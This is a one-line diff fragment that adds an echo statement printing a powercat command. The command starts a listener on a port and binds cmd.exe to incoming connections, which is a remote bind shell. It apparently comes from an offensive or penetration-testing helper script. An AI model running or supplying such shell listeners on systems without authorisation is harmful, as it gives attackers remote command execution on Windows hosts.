@@ -1,0 +1,1 @@
+echo -e "\t\033[1mpowercat -l -p $PORT -e cmd.exe\033[m"
